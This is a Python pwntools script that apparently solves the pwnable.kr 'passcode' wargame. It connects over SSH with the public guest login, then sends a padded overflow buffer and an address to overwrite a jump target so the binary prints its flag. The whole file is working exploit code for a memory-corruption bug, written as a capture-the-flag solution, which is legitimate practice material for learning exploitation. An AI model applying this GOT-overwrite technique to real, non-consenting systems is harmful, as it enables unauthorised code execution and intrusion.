from pwn import *

hostname = "pwnable.kr"
portnum = 2222
username = "passcode"
passwd   = "guest"

buf = b"A"*96 + b"\x04\xa0\x04\x08"
catflag = 0x80485d7

def main():

    s = ssh(host=hostname,
            port=portnum,
            user=username,
            password=passwd)

    p = s.process("/home/passcode/passcode")
    msg = p.recvuntil(": ")
    for m in msg.split(b"\n"):
        print(m)

    p.sendline(buf)
    msg = p.recvuntil(": ")
    for m in msg.split(b"\n"):
        print(m)

    p.sendline(str(catflag))

    p.interactive()

if __name__ == "__main__":
    main()
